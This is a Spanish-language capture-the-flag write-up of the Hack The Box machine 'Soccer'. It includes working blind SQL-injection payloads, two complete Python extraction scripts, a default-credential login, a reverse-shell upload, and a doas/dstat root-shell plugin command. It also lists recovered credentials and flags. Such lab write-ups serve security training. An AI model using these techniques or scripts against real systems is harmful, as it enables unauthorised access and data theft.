  
# Soccer (Linux) ![Tux](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/common-images/linux.jpg?raw=true)  - Español
![](images/soccerBanner.jpg)
Creador de la máquina: **sau123**
### Writeup por Tnr1112


# Loot
## Credenciales

* **mysql:** player:PlayerOftheMatch2022
* **ssh:** player:PlayerOftheMatch2022

## Cuentas locales
* root
* player

****
# Common enumeration

## Nmap

| Port | Software    | Version                                 | Status  |
| ---- | ----------- | --------------------------------------- | ------- |
| 22   | ssh      | OpenSSH 8.2p1 Ubuntu4                              | open    |
| 80   | http        | nginx 1.18.0                      | open    |
| 9091  | xmltec-xmlmail | ?           | open    |


```bash
# Nmap 7.92 scan initiated Sun Feb 26 14:29:03 2023 as: nmap -p22,80,9091 -sCV -oN targeted 10.10.11.194
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.18s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Soccer - Index 
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sun, 26 Feb 2023 17:29:15 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sun, 26 Feb 2023 17:29:16 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.92%I=7%D=2/26%Time=63FB96E7%P=x86_64-pc-linux-gnu%r(in
SF:formix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\
SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x20139\r\nDate:\x20Sun,\x2026\x20Feb\x202023\x2017:29:15\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang
SF:=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</
SF:head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HT
SF:TPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\
SF:r\nDate:\x20Sun,\x2026\x20Feb\x202023\x2017:29:16\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<me
SF:ta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>C
SF:annot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HT
SF:TP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-s
SF:rc\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sun,\
SF:x2026\x20Feb\x202023\x2017:29:16\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"u
SF:tf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\
SF:x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 26 14:29:32 2023 -- 1 IP address (1 host up) scanned in 29.75 seconds
```

## Gobuster

### Directory listing
```bash
sudo gobuster dir -u 'http://soccer.htb' -t 200 -w '/usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt'
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/28 21:57:08 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
                                                                             
===============================================================
2023/02/28 22:01:00 Finished
===============================================================
```

Encontramos una ruta: **tiny**

### Subdomain listing
```bash
sudo gobuster vhost -u 'http://soccer.htb' -t 200 -w '/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt' 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://soccer.htb
[+] Method:       GET
[+] Threads:      200
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/02/28 22:05:24 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2023/02/28 22:05:47 Finished
===============================================================
```

****
# Webpages overview
## soccer.htb

![](15-SoccerWebPage.png)
Nada acá, no hay user inputs. Simplemente esta página.

## soccer.htb/tiny

![](15-tinyWebpage.png)

****
# soccer.htb/tiny

![](15-tinyWebpage.png)
Encontramos un panel de autenticación de  `Tiny File Manager`.
>**Tiny File Manager** es un administrador de archivos web fácil de usar y rápido. Te permite subir, editar y administrar archivos y carpetas vía navegador. La aplicación corre en PHP 5.5+. También es capaz de crear multiples usuarios, cada uno con su directorio propio.

![](20-DefCredsTiny.png)

Probamos las credenciales por defecto: **admin:admin@123** o con **user:12345** y entramos

![](20-Tiny1.png)

Al intentar subir un archivo nos tira un error de que la carpeta no es escribible

![](20-Tiny2.png)

Pero si accedemos a tiny/uploads si podemos. Vamos a subir una **reverse shell** en php

![](20-Tiny3.png)
Ahora es cuestión de acceder al archivo mediante la ruta: `http://soccer.htb/tiny/uploads/revShell.php`

Y obtenemos una **shell**

![](20-RevShell.png)

****
# www-data
Gracias a la revshell obtenida en [20 - soccer.htb-tiny](20%20-%20soccer.htb-tiny.md)

Encontramos solo dos usuarios con una **shell** en el sistema
```bash
cat /etc/passwd | awk '/sh$/'
root:x:0:0:root:/root:/bin/bash
player:x:1001:1001::/home/player:/bin/bash
```

Bucamos si hay otro subdominio que no hayamos podido enumerar de la forma tradicional

```bash
www-data@soccer:/etc/nginx/sites-enabled$ ls -la
total 8
drwxr-xr-x 2 root root 4096 Dec  1 13:48 .
drwxr-xr-x 8 root root 4096 Nov 17 08:06 ..
lrwxrwxrwx 1 root root   34 Nov 17 08:06 default -> /etc/nginx/sites-available/default
lrwxrwxrwx 1 root root   41 Nov 17 08:39 soc-player.htb -> /etc/nginx/sites-available/soc-player.htb
www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb 
server {
	listen 80;
	listen [::]:80;

	server_name soc-player.soccer.htb;

	root /root/app/views;

	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_set_header Host $host;
		proxy_cache_bypass $http_upgrade;
	}

}

```

Encontramos `soc-player.htb`. La página es igual, solo que ahora hay más pestañas en el navbar

![](25-Soc-playerWebPage.png)

Nos creamos una cuenta

![](25-Soc-playerRegister.png)

Y estamos dentro

![](25-Soc-playerCheck1.png)

Si ponemos el número de ticket que nos indica, vemos que dice `Ticket Exists`.

![](25-Soc-playerCheck2.png)

## SQLI
Leyendo un poco el código, vemos que se conecta a través de un **websocket** por el puerto **9091**.
```javascript
    <script>
        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
        
        var btn = document.getElementById('btn');
        var input = document.getElementById('id');
        
        ws.onopen = function (e) {
            console.log('connected to the server')
        }
        input.addEventListener('keypress', (e) => {
            keyOne(e)
        });
        
        function keyOne(e) {
            e.stopPropagation();
            if (e.keyCode === 13) {
                e.preventDefault();
                sendText();
            }
        }
        
        function sendText() {
            var msg = input.value;
            if (msg.length > 0) {
                ws.send(JSON.stringify({
                    "id": msg
                }))
            }
            else append("????????")
        }
        }
        
        ws.onmessage = function (e) {
        append(e.data)
        }
        
        function append(msg) {
        let p = document.querySelector("p");
        // let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
        // p.style.color = randomColor;
        p.textContent = msg
        }
    </script>
```
Probando con:
```javascript
ws.send(JSON.stringify({
    "id": `" or 1=1 -- -`
}))
```
Devuelve `Ticket Doesn't Exist`
Pero si ahora probamos con:
```javascript
ws.send(JSON.stringify({
    "id": `"" or 1=1 -- -`
}))
```

Devuelve `Ticket Exists`. Gracias a esto, nos damos cuenta de que estamos en frente de una **Blind SQLI**

Ahora nos queda descubrir la cantidad de columnas que tiene la tabla actual. Esto lo hacemos mediante un ordenamiento de las columnas, tenemos que ir probando con la cantidad hasta que nos devuelva `Ticket Exists`

```javascript
ws.send(JSON.stringify({
    "id": `"" or 1=1 order by 3 -- -`
}))
```
En este caso tiene 3 columnas

Ahora resta encontrar el nombre de la base de datos. Repetimos el proceso iterando por las el abecedario. En el momento que la response tarde 5 segundos, sabremos que la posición de la letra es la que estamos probando.

```javascript
ws.send(JSON.stringify({
    "id": `"" or 1=1 union select 1,2,if(LOWER(substr(database(),1,1) = 's'), sleep(5),0) -- -`
}))
```

En este caso la primer letra es la s
La base de datos es: **soccer_db**
****
## Scripting

Para que sea más fácil, creé dos scripts en python para obtener todas las bases de datos, junto con sus tablas, columnas y los datos de las mismas. Hice dos scripts porque hay dos formas de explotar este SQLI, uno es basándonos en el valor booleano que nos devuelve y el otro es basado en el tiempo, si tarda lo que le indicamos es porque ese valor es el correcto.

### **Timed based**
```python
import json, time, signal, sys
from websocket import create_connection
from pwn import *
import time

sqlValuesToFind = {"DatabasesName":"(select SCHEMA_NAME from information_schema.schemata where schema_name not in ('information_schema','performance_schema','mysql','sys') limit %d,1)",
"TablesName":"(select TABLE_NAME from information_schema.tables where table_schema = '{databaseName}' limit %d,1)",
"ColumnsName":"(select column_name from information_schema.columns where table_schema = '{databaseName}' and table_name = '{tableName}' limit %d,1)",
"ValuesTable":"(select concat_ws(',',{columnsName}) from {databaseName}.{tableName} limit %d,1)"}
values = {}
values["DatabasesName"] = []
values["TablesName"] = []
values["ColumnsName"] = []
values["ValuesTable"] = []
alphabet = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","_",",","1","2","3","4","5","6","7","8","9","0","@","."]
valueToFind = ""
ws_server = "ws://soc-player.soccer.htb:9091"
ws = create_connection(ws_server)

def formatOne(s: str, field: str, value: str):
	idx_begin = s.find('{'+field+'}')
	idx_end = idx_begin + len(field) + 2
	return s[:idx_begin] + value + s[idx_end:]

def findCharacter(valueToFind, sqlValueToFind):
	for limitIterator in range(11):
		valueToFind = ""
		actualValue.status(valueToFind)
		flag = False
		sqlValueToFindFormated = sqlValueToFind % limitIterator
		for charIterator in range(1,100):
			for letter in alphabet:
				payload = '''"" or 1=1 union select 1,2,if(binary substr(%s,%d,1) = '%s', sleep(11),0) -- -''' % (sqlValueToFindFormated,charIterator,letter)
				data = {
						"id": payload,
				}

				bar.status(f"Trying {sqlValueToFindFormated} with letter {letter} on position {charIterator}")

				dataJSON = json.dumps(data)
				startTime = time.time()
				ws.send(dataJSON)
				ws.recv()
				endTime = time.time()
				respTime = endTime - startTime
				if respTime > 11:
					valueToFind += letter
					actualValue.status(valueToFind)
					break
				elif letter == alphabet[-1]:
					flag = True
					break
			if flag == True:
				break
		if flag == True and valueToFind == "":
			return True
			break
		log.info(f"  •{valueToFind}")
		values[index].append(valueToFind)

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

#Ctrl + c
signal.signal(signal.SIGINT, def_handler)

bar = log.progress("SQLI Timed based")
bar.status("Starting")
actualValue = log.progress("Actual value")

for index in sqlValuesToFind:
	print("-----------------------------------------------------------------------------------")
	log.info(f"{index}:")
	sqlValueToFindParameters = sqlValuesToFind[index]
	if len(values["DatabasesName"]) > 0:
		for databaseName in values["DatabasesName"]:
			log.info(f"DB: {databaseName}:")
			sqlValueToFindDatabase = formatOne(sqlValuesToFind[index],"databaseName",databaseName)
			if len(values["TablesName"]) > 0:
				for tableName in values["TablesName"]:
					log.info(f"Table: {tableName}:")
					sqlValueToFindTables = formatOne(sqlValueToFindDatabase,"tableName",tableName)
					if len(values["ColumnsName"]) > 0:
						columnsToConcat = (",".join(values["ColumnsName"]))
						log.info(f"  Columns: {columnsToConcat}:")
						sqlValueToFindColumns = formatOne(sqlValueToFindTables,"columnsName",columnsToConcat)
						valueToFind = findCharacter(valueToFind, sqlValueToFindColumns)
						if valueToFind == "":
							actualValue.status(valueToFind)
							break
					else:
						valueToFind = findCharacter(valueToFind, sqlValueToFindTables)
						if valueToFind == "":
							actualValue.status(valueToFind)
							break
			else:
				valueToFind = findCharacter(valueToFind, sqlValueToFindDatabase)
				if valueToFind == "":
					actualValue.status(valueToFind)
					break
	else:
		valueToFind = findCharacter(valueToFind, sqlValueToFindParameters)
		if valueToFind == "":
			actualValue.status(valueToFind)
			break

print("-----------------------------------------------------------------------------------")
ws.close()
```

#### Demostración del timed based:

![](25-TimedBased.png)

### **Boolean based**

```python
import json, time, signal, sys
from websocket import create_connection
from pwn import *
import time

sqlValuesToFind = {"DatabasesName":"(select SCHEMA_NAME from information_schema.schemata where schema_name not in ('information_schema','performance_schema','mysql','sys') limit %d,1)",
"TablesName":"(select TABLE_NAME from information_schema.tables where table_schema = '{databaseName}' limit %d,1)", 
"ColumnsName":"(select column_name from information_schema.columns where table_schema = '{databaseName}' and table_name = '{tableName}' limit %d,1)",
"ValuesTable":"(select concat_ws(',',{columnsName}) from {databaseName}.{tableName} limit %d,1)"}
values = {}
values["DatabasesName"] = []
values["TablesName"] = []
values["ColumnsName"] = []
values["ValuesTable"] = []
alphabet = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","_",",","1","2","3","4","5","6","7","8","9","0","@","."]
valueToFind = ""
ws_server = "ws://soc-player.soccer.htb:9091"
ws = create_connection(ws_server)

def formatOne(s: str, field: str, value: str):
	idx_begin = s.find('{'+field+'}')
	idx_end = idx_begin + len(field) + 2
	return s[:idx_begin] + value + s[idx_end:]

def findCharacter(valueToFind, sqlValueToFind):
	for limitIterator in range(11):
		valueToFind = ""
		actualValue.status(valueToFind)
		flag = False
		sqlValueToFindFormated = sqlValueToFind % limitIterator
		for charIterator in range(1,100):
			for letter in alphabet:
				payload = '''"" or binary substr(%s,%d,1) = '%s' -- -''' %  (sqlValueToFindFormated,charIterator,letter)
				data = {
						"id": payload,
				}

				bar.status(f"Trying {sqlValueToFindFormated} with letter {letter} on position {charIterator}")

				dataJSON = json.dumps(data)
				ws.send(dataJSON)
				resp = ws.recv()
				if resp == "Ticket Exists":
					valueToFind += letter
					actualValue.status(valueToFind)
					break
				elif letter == alphabet[-1]:
					flag = True
					break
			if flag == True:
				break
		if flag == True and valueToFind == "":
			return True
			break
		log.info(f"  •{valueToFind}")
		values[index].append(valueToFind)

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

#Ctrl + c
signal.signal(signal.SIGINT, def_handler)

bar = log.progress("SQLI Boolean based")
bar.status("Starting")
actualValue = log.progress("Actual value")

for index in sqlValuesToFind:
	print("-----------------------------------------------------------------------------------")
	log.info(f"{index}:")
	sqlValueToFindParameters = sqlValuesToFind[index]
	if len(values["DatabasesName"]) > 0:
		for databaseName in values["DatabasesName"]:
			log.info(f"DB: {databaseName}:")
			sqlValueToFindDatabase = formatOne(sqlValuesToFind[index],"databaseName",databaseName)
			if len(values["TablesName"]) > 0:
				for tableName in values["TablesName"]:
					log.info(f"Table: {tableName}:")
					sqlValueToFindTables = formatOne(sqlValueToFindDatabase,"tableName",tableName)
					if len(values["ColumnsName"]) > 0:
						columnsToConcat = (",".join(values["ColumnsName"]))
						log.info(f"  Columns: {columnsToConcat}:")
						sqlValueToFindColumns = formatOne(sqlValueToFindTables,"columnsName",columnsToConcat)
						valueToFind = findCharacter(valueToFind, sqlValueToFindColumns)
						if valueToFind == "":
							actualValue.status(valueToFind)
							break
					else:
						valueToFind = findCharacter(valueToFind, sqlValueToFindTables)
						if valueToFind == "":
							actualValue.status(valueToFind)
							break
			else:
				valueToFind = findCharacter(valueToFind, sqlValueToFindDatabase)
				if valueToFind == "":
					actualValue.status(valueToFind)
					break
	else:
		valueToFind = findCharacter(valueToFind, sqlValueToFindParameters)
		if valueToFind == "":
			actualValue.status(valueToFind)
			break

print("-----------------------------------------------------------------------------------")
ws.close()
```

#### Demostración del boolean based

Como vemos tarda **10m 27s**, mucho menos que lo que tarda el timed based que por cada vez que encuentra un caracter tiene que esperar un tiempo determinado.

![](25-BooleanBased.png)

****
# Player

## Reutilización de credenciales

Utilizando las credenciales obtenidas por medio del **SQLI** en [15 - Webpages](15%20-%20Webpages.md) nos logueamos como player por `ssh`, obteniendo la flag de **user**

```bash
player@soccer:~$ ls -la
total 36
drwxr-xr-x 5 player player 4096 Mar  9 19:33 .
drwxr-xr-x 3 root   root   4096 Nov 17 09:25 ..
lrwxrwxrwx 1 root   root      9 Nov 17 09:02 .bash_history -> /dev/null
-rw-r--r-- 1 player player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 player player 3771 Feb 25  2020 .bashrc
drwx------ 2 player player 4096 Nov 17 09:00 .cache
drwx------ 2 player player 4096 Mar  9 19:33 .gnupg
-rw-r--r-- 1 player player  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 Nov 17 09:02 .viminfo -> /dev/null
drwx------ 3 player player 4096 Mar  9 19:33 snap
-rw-r----- 1 root   player   33 Mar  9 18:52 user.txt
player@soccer:~$ cat user.txt 
3b89343af628797ea78aa68b0498695e
player@soccer:~$ 
```

Utilizando el [linpeas](https://github.com/carlospolop/PEASS-ng), nos damos cuenta de que hay un archivo de configuración llamado `doas.conf` junto con su ejecutable en `/usr/local/bin/doas`.

>**doas** es un programa para ejecutar comandos como otro usuario, generalmente como **root**. El administrador del sistema puede configurarlo para dar a determinados usuarios distintos privilegios para ejecutar **comandos**.

Si miramos el archivo de configuración, podemos notar que nos permite ejecutar como **root** el comando `/usr/bin/dstat`

```bash
player@soccer:/tmp$ ./linpeas.sh
...[snip]...
╔══════════╣ Checking doas.conf
permit nopass player as root cmd /usr/bin/dstat
...[snip]...
                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═══════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/local/bin/doas
/usr/bin/g++
/usr/bin/gcc
/snap/bin/lxc
/usr/bin/make
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget
...[snip]...
```

>**dstat** es una herramienta de estadística de recursos versátil. Combina la capacidad de iostat, vmstat, netstat e ifstat. Nos permite monitorear los recursos del sistema en tiempo real.

Utilizando [GTFOBINS](https://gtfobins.github.io/gtfobins/dstat/) podemos darnos cuenta de que `dstat` permite **ejecutar scripts de python** cargados como "Plugins externos" si están ubicados en uno de los directorios indicados en el manual de dstat abajo de "FILES"

```bash
player@soccer:/tmp$ man dstat
...[snip]...
FILES
       Paths that may contain external dstat_*.py plugins:

           ~/.dstat/
           (path of binary)/plugins/
           /usr/share/dstat/
           /usr/local/share/dstat/

```

Como `doas` nos permite ejecutar `dstat` como **root**, vamos a utilizar la forma de "Sudo" creando un script en python para obtener una shell insertándolo en la ruta `/usr/local/share/dstat/dstat_xxx.py`

```bash
player@soccer:/tmp$ echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
player@soccer:/tmp$ doas /usr/bin/dstat --xxx
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat /root/root.txt
7adb4c2f31eef4f9e7877f05fedec746
$ 
```

Y listo, obtenemos una shell como **root**.
****
